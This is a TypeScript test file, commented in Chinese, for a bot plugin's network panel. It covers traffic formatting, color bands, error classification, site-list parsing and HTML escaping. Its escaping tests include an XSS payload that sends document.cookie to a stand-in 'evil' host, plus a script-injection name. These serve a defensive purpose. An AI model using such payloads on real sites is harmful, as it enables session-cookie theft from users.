/**
 * 模块职责：`collect/network.ts` 里纯函数的测试 —— 采样成形、配色分档、错误归纳、HTML 转义
 * 依赖方向：被测模块
 * 生命周期：测试
 * 注意事项：**`probeSites` 的并发队列不测。** 它要真发 HTTP 请求，测它等于测网络与对端站点
 *          （Google 在 CI 上时通时不通）。真要测就得把 `HttpClient` 整个换掉，那测的是
 *          那个替身而不是本插件。故这里只测它拆出来的纯函数，以及 `escapeHtml` ——
 *          那一处是模板里唯一把使用者可控文本放进不转义输出的地方，必须转义对。
 */

import { describe, expect, it } from "vitest"
import type { HttpClient } from "@yunzai-ng/types"
import { delayColor, errorReason, escapeHtml, parseSiteLine, probeSites, statusColor, toNetworkView } from "./network.js"

describe("toNetworkView", () => {
  it("速率与累计量都齐时都给", () => {
    const view = toNetworkView({
      iface: "eth0",
      rx_sec: 1024,
      tx_sec: 2048,
      rx_bytes: 1024 ** 2,
      tx_bytes: 2 * 1024 ** 2
    })
    expect(view).toBeDefined()
    expect(view?.speed.download).toEqual({ size: "1.00", suffix: " KB" })
    expect(view?.speed.upload).toEqual({ size: "2.00", suffix: " KB" })
    expect(view?.traffic?.download).toEqual({ size: "1.00", suffix: " MB" })
    expect(view?.traffic?.upload).toEqual({ size: "2.00", suffix: " MB" })
  })

  it("`showByte: false`：小于 1K 时不带 `B`（后面跟着 `/s`），大于 1K 的照常带", () => {
    // `showByte` 只管 B 那一档 —— 它的单位是多余的，而 KB / MB 的 `B` 是有信息量的
    const view = toNetworkView({ rx_sec: 512, tx_sec: 1024, rx_bytes: 1, tx_bytes: 1 })
    expect(view?.speed.download).toEqual({ size: "512", suffix: " B" })
    expect(view?.speed.upload).toEqual({ size: "1.00", suffix: " KB" })
  })

  it("没有采样时 undefined —— 模板据此隐去整个板块", () => {
    expect(toNetworkView(undefined)).toBeUndefined()
    expect(toNetworkView({})).toBeUndefined()
  })

  it("速率只有一半时不给速率（上行缺失会被读成上行真的是 0）", () => {
    expect(toNetworkView({ rx_sec: 1024 })).toBeUndefined()
    expect(toNetworkView({ tx_sec: 1024 })).toBeUndefined()
  })

  it("累计量全为 0 时不当成「没流量」而是「还没采到」", () => {
    // 刚启动时 `si` 给的累计量就是 0
    expect(toNetworkView({ rx_bytes: 0, tx_bytes: 0 })).toBeUndefined()
  })

  it("累计量只有一半时不出现累计量那一项", () => {
    const view = toNetworkView({ rx_sec: 1, tx_sec: 1, rx_bytes: 1024 })
    expect(view).toBeDefined()
    expect(view?.speed).toBeDefined()
    expect(view?.traffic).toBeUndefined()
  })

  it("有累计量无速率时只给累计量", () => {
    const view = toNetworkView({ rx_bytes: 1024, tx_bytes: 1024 })
    expect(view).toBeDefined()
    expect(view?.speed).toBeUndefined()
    expect(view?.traffic).toBeDefined()
  })

  it("非数字的字段被忽略", () => {
    // `si` 的字段在部分平台上会是 null 或字符串
    const view = toNetworkView({ rx_sec: null as unknown as number, tx_sec: 1 })
    expect(view).toBeUndefined()
  })
})

describe("delayColor", () => {
  it("快的是绿色", () => {
    expect(delayColor(0)).toBe("#188038")
    expect(delayColor(500)).toBe("#188038")
  })

  it("中档是橙色", () => {
    expect(delayColor(501)).toBe("#d68100")
    expect(delayColor(2000)).toBe("#d68100")
  })

  it("慢的是红色", () => {
    expect(delayColor(2001)).toBe("#F44336")
    expect(delayColor(60000)).toBe("#F44336")
  })

  it("边界不含糊", () => {
    expect(delayColor(500)).not.toBe(delayColor(501))
    expect(delayColor(2000)).not.toBe(delayColor(2001))
  })
})

describe("statusColor", () => {
  it("2xx 绿、3xx 橙、4xx 红、5xx 紫", () => {
    expect(statusColor(200)).toBe("#188038")
    expect(statusColor(301)).toBe("#FF9800")
    expect(statusColor(404)).toBe("#F44336")
    expect(statusColor(500)).toBe("#9C27B0")
  })

  it("1xx 是蓝色信息色", () => {
    expect(statusColor(100)).toBe("#03A9F4")
  })

  it("0 与负数给空串（没有颜色）", () => {
    expect(statusColor(0)).toBe("")
    expect(statusColor(-1)).toBe("")
  })

  it("4xx 与 5xx 颜色不同 —— 混成一色会让人排查错方向", () => {
    // 4xx 是「请求本身有问题」（网址填错了），5xx 是「对面挂了」
    expect(statusColor(404)).not.toBe(statusColor(503))
  })
})

describe("errorReason", () => {
  it("超时", () => {
    expect(errorReason(new Error("The operation was aborted"))).toBe("Timeout")
    const abort = new Error("boom")
    abort.name = "AbortError"
    expect(errorReason(abort)).toBe("Timeout")
  })

  it("按 errno 分类", () => {
    expect(errorReason(new Error("read ECONNRESET"))).toBe("Econnreset")
    expect(errorReason(new Error("getaddrinfo ENOTFOUND example.com"))).toBe("DNS")
    expect(errorReason(new Error("getaddrinfo EAI_AGAIN"))).toBe("DNS")
    expect(errorReason(new Error("connect ECONNREFUSED 127.0.0.1:80"))).toBe("Refused")
    expect(errorReason(new Error("self-signed certificate"))).toBe("TLS")
    expect(errorReason(new Error("unable to verify the first certificate"))).toBe("TLS")
    expect(errorReason(new Error("CERT_HAS_EXPIRED"))).toBe("TLS")
  })

  it("认不出的给通用标签", () => {
    expect(errorReason(new Error("something else"))).toBe("Error")
  })

  it("非 Error 给通用标签 —— 抛出的可能是个字符串", () => {
    expect(errorReason("bang")).toBe("Error")
    expect(errorReason(undefined)).toBe("Error")
    expect(errorReason(null)).toBe("Error")
    expect(errorReason({ message: "ECONNRESET" })).toBe("Error")
  })

  it("Econnreset 先于其它判断 —— 它的消息里通常也含 `connect`", () => {
    // 顺序反了会让 ECONNRESET 被归成别的
    expect(errorReason(new Error("connect ECONNRESET 1.2.3.4:443"))).toBe("Econnreset")
  })
})

describe("escapeHtml", () => {
  it("转义五个特殊字符", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;")
    expect(escapeHtml(`"double"`)).toBe("&quot;double&quot;")
    expect(escapeHtml("'single'")).toBe("&#39;single&#39;")
    expect(escapeHtml("a & b")).toBe("a &amp; b")
  })

  it("`&` 先于其它替换 —— 否则会把刚生成的实体再转一遍", () => {
    // 顺序反了 `<` 会先变成 `&lt;`，再被 `&` 那条规则改成 `&amp;lt;`
    expect(escapeHtml("<")).toBe("&lt;")
    expect(escapeHtml("&lt;")).toBe("&amp;lt;")
  })

  it("普通文本与中文原样", () => {
    expect(escapeHtml("连接超时")).toBe("连接超时")
    expect(escapeHtml("abc123")).toBe("abc123")
  })

  it("挡住一条典型的注入串", () => {
    const evil = `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`
    const out = escapeHtml(evil)
    expect(out).not.toContain("<")
    expect(out).not.toContain(">")
    expect(out).not.toContain('"')
    expect(out).toContain("&lt;img")
  })

  it("空串给空串", () => {
    expect(escapeHtml("")).toBe("")
  })
})

describe("网站测试的解析", () => {
  /** 收集告警，供下面断言"告了几条、说了什么" */
  const collector = (): { readonly list: string[]; readonly onWarn: (m: string) => void } => {
    const list: string[] = []
    return { list, onWarn: (m: string) => list.push(m) }
  }

  it("三段齐全时各归各位", () => {
    const { list, onWarn } = collector()
    expect(parseSiteLine("Google | https://google.com | 1", 0, onWarn)).toEqual({
      name: "Google",
      url: "https://google.com",
      useProxy: true
    })
    expect(list).toEqual([])
  })

  it("多余的空白不影响解析", () => {
    expect(parseSiteLine("  百度   |   https://baidu.com   |  0  ", 0, () => undefined)).toEqual({
      name: "百度",
      url: "https://baidu.com",
      useProxy: false
    })
  })

  it("只有网址时，网址当名字", () => {
    expect(parseSiteLine("https://baidu.com", 0, () => undefined)).toEqual({
      name: "https://baidu.com",
      url: "https://baidu.com",
      useProxy: false
    })
  })

  it("名称留空时也用网址兜底 —— 表格那一列不该是一格空白", () => {
    expect(parseSiteLine("| https://baidu.com | 1", 0, () => undefined)).toEqual({
      name: "https://baidu.com",
      url: "https://baidu.com",
      useProxy: true
    })
  })

  it("**全角竖线一并接受** —— 中文输入法下最容易打错的就是它，而它与半角长得一样", () => {
    const { list, onWarn } = collector()
    expect(parseSiteLine("Google｜https://google.com｜1", 0, onWarn)).toEqual({
      name: "Google",
      url: "https://google.com",
      useProxy: true
    })
    // 不归一化的话这一项会因"不是 http 开头"被跳过，使用者只会看到"我配的那项没了"
    expect(list).toEqual([])
  })

  it("全角与半角混用也认", () => {
    expect(parseSiteLine("Google｜https://google.com|1", 0, () => undefined)?.useProxy).toBe(true)
  })

  it("走代理的几种真值写法", () => {
    const on = ["1", "true", "TRUE", "yes", "Yes", "是"]
    for (const text of on) {
      expect(parseSiteLine(`A | https://a.com | ${text}`, 0, () => undefined)?.useProxy).toBe(true)
    }
  })

  it("其余一律为假，且**不告警** —— 与「没写」等价，而默认就是不代理", () => {
    const off = ["0", "false", "no", "否", "", "随便写的", "2"]
    for (const text of off) {
      const { list, onWarn } = collector()
      expect(parseSiteLine(`A | https://a.com | ${text}`, 0, onWarn)?.useProxy).toBe(false)
      expect(list).toEqual([])
    }
  })

  it("不写第三段时为假", () => {
    expect(parseSiteLine("A | https://a.com", 0, () => undefined)?.useProxy).toBe(false)
    expect(parseSiteLine("A | https://a.com |", 0, () => undefined)?.useProxy).toBe(false)
  })

  it("**网址不是 http(s):// 时跳过该项并告警一次**，而不是让整次测试失败", () => {
    const { list, onWarn } = collector()
    expect(parseSiteLine("A | ftp://a.com | 1", 0, onWarn)).toBeUndefined()
    expect(list).toHaveLength(1)
    // 告警里要带上行号与人写的那一行，否则十项里哪一项写错了无从得知
    expect(list[0]).toContain("第 1 项")
    expect(list[0]).toContain("ftp://a.com")
  })

  it("行号从 0 起，告警里报的是人看到的那一号", () => {
    const { list, onWarn } = collector()
    parseSiteLine("A | 不是网址", 4, onWarn)
    expect(list[0]).toContain("第 5 项")
  })

  it("大小写不敏感地接受 HTTPS://", () => {
    expect(parseSiteLine("A | HTTPS://a.com", 0, () => undefined)?.url).toBe("HTTPS://a.com")
  })

  it("多打了竖线时取前两段，不报错 —— 网址不含竖线，多出来的段只能来自手误", () => {
    const { list, onWarn } = collector()
    expect(parseSiteLine("A | https://a.com | 1 | 多打的", 0, onWarn)).toEqual({
      name: "A",
      url: "https://a.com",
      useProxy: true
    })
    expect(list).toEqual([])
  })

  it("空行返回 undefined 且**不告警** —— 药丸输入框允许存在空项，那不是错误", () => {
    const { list, onWarn } = collector()
    expect(parseSiteLine("", 0, onWarn)).toBeUndefined()
    expect(parseSiteLine("   ", 0, onWarn)).toBeUndefined()
    expect(parseSiteLine("|", 0, onWarn)).toBeUndefined()
    expect(parseSiteLine(" | | ", 0, onWarn)).toBeUndefined()
    expect(list).toEqual([])
  })

  it("空行与写错的行必须区分开：前者无声，后者有声", () => {
    // 这一条盯着的是上面两条的**差别**：把空行也告警一遍，日志里就全是噪音
    const empty = collector()
    parseSiteLine("", 0, empty.onWarn)
    const bad = collector()
    parseSiteLine("不是网址", 0, bad.onWarn)
    expect(empty.list).toEqual([])
    expect(bad.list).toHaveLength(1)
  })
})

describe("probeSites 的名字转义", () => {
  /**
   * 一个只回状态码的假客户端
   *
   * 这里破例给 `probeSites` 造替身：要守的不是"请求发得对不对"（那要真联网），而是
   * **名字有没有转义**。名字取自使用者可在面板上编辑的文本，而模板里那一格不转义。
   */
  const fakeHttp = (): HttpClient =>
    ({
      /**
       * 装成一次成功的请求
       * @returns 固定状态码
       */
      request: async () => ({ status: 200 })
    }) as unknown as HttpClient

  it("**名字里的 HTML 被转义** —— 面板上可编辑之后它就成了注入点", async () => {
    const rows = await probeSites(
      fakeHttp(),
      [{ name: `"><script>alert(1)</script>`, url: "https://a.com" }],
      1,
      1000,
      () => undefined
    )
    expect(rows[0]?.name).not.toContain("<")
    expect(rows[0]?.name).not.toContain(">")
    expect(rows[0]?.name).not.toContain('"')
    expect(rows[0]?.name).toContain("&lt;script&gt;")
  })

  it("中文与普通名字原样保留", async () => {
    const rows = await probeSites(fakeHttp(), [{ name: "百度", url: "https://a.com" }], 1, 1000, () => undefined)
    expect(rows[0]?.name).toBe("百度")
  })
})
